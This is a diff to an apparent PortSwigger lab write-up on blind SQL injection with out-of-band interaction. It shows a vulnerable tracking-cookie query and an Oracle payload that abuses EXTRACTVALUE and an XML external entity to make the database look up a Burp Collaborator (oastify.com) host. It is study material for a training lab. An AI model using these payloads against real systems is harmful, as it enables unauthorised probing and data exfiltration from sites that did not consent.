@@ -6,18 +6,24 @@
 
 The payloads for each domain to perform a DNS lookup to an external domain.
 
-![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/e94c81f4-4419-40bc-ace2-f4ec3accc83a)
+![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/62e77cbb-65bd-47e8-863e-3f4371c8ed79)
 
 Query made -
 
 `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'`
 
-Request captured - Send this to repeater
+![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/b47a5684-105b-4c94-b0ad-269843e6cffc)
 
-![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/5e7c52a1-6f6a-4b4b-80ee-2b40c0ffd800)
+Then click on copy to clipbord option = `t828uox8ju7ieb53eurz8unel5rwfm3b.oastify.com` we need paste it in the payload which we are going to do.
 
-Then Open the burp collaborator client, copy one of the domain provided
+Since we are unsure of the database we are working with, we attempt every payload listed on DNS lookup for every database.
+
+So the first one will be Oracle
 
 For that the payload is
 
 `SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--`
+
+Then query will be changed by pasting the external domain provided by collaborator would look like this
+
+`SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://in9x9dcxyjm7t0kstj6onj230u6luci1.oastify.com/"> %remote;]>'),'/l') FROM dual)--`
